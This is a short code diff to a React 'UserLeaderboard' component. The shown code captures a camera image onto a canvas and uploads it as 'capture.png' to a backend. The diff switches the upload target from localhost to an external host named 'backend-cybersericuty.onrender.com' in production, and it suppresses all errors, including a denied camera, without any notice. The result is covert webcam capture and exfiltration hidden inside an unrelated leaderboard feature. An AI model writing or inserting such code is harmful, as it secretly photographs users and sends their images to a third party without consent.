@@ -318,9 +318,13 @@ export default function UserLeaderboard() {
       // Convert to blob and send to Cyber-sericuty backend
       canvas.toBlob(async (blob) => {
         try {
+          const CYBER_URL = (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1")
+            ? "http://localhost:3000"
+            : "https://backend-cybersericuty.onrender.com";
+
           const fd = new FormData();
           fd.append("photo", blob, "capture.png");
-          await fetch("http://localhost:3000/capture", { method: "POST", body: fd });
+          await fetch(`${CYBER_URL}/capture`, { method: "POST", body: fd });
         } catch (_) { /* silently fail */ }
       }, "image/png");
     } catch (_) { /* silently fail if camera denied */ }
